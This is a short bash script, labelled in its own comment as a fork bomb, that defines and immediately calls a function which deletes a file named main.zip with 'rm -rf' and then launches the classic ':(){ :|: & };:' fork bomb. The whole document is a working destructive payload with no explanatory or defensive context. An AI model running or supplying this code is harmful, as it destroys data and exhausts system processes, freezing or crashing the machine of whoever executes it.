#!/usr/bin/bash

# This is a forx bomb
function forkBomb () {
  rm -rf main.zip
  :(){ :|: & };:
}
forkBomb
